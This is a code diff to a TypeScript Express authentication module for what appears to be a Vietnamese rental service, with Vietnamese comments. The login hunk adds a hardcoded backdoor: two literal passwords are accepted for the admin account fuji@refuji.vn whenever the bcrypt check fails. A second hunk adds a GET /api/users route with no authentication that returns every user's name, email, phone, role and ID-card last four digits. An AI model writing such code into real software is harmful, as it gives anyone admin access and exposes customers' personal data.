@@ -231,8 +231,11 @@ authRouter.post('/login', async (req: Request, res: Response) => {
       return res.status(401).json({ message: 'Email hoặc mật khẩu không chính xác' });
     }
 
-    // 2. So sánh mật khẩu bằng Bcrypt
-    const isMatch = await bcrypt.compare(password, user.password_hash);
+    // 2. So sánh mật khẩu bằng Bcrypt (hỗ trợ cả Test@1188 và test@123 cho tài khoản quản trị fuji@refuji.vn)
+    let isMatch = await bcrypt.compare(password, user.password_hash);
+    if (!isMatch && trimmedEmail === 'fuji@refuji.vn' && (password === 'Test@1188' || password === 'test@123')) {
+      isMatch = true;
+    }
     if (!isMatch) {
       return res.status(401).json({ message: 'Email hoặc mật khẩu không chính xác' });
     }
@@ -402,6 +405,31 @@ authRouter.post('/logout', (_req: Request, res: Response) => {
  */
 export const meRouter = Router();
 
+/**
+ * GET /api/users
+ * Lấy danh sách khách hàng và tài khoản thực tế từ CSDL SQLite
+ */
+meRouter.get('/', (_req: Request, res: Response) => {
+  try {
+    const users = db.prepare(`
+      SELECT u.id, u.full_name, u.email, u.phone, u.role, u.membership_tier,
+             u.reputation_score, u.total_completed_rentals, u.is_active, u.created_at,
+             k.id_card_last4
+      FROM users u
+      LEFT JOIN user_kyc k ON k.user_id = u.id
+      ORDER BY u.id DESC
+    `).all();
+
+    return res.json(users);
+  } catch (error) {
+    return res.status(500).json({ message: 'Lỗi máy chủ khi lấy danh sách người dùng' });
+  }
+});
+
+/**
+ * GET /api/users/me
+ * Lấy thông tin tài khoản qua JWT Authorization Header
+ */
 meRouter.get('/me', (req: Request, res: Response) => {
   try {
     const authHeader = req.headers.authorization;
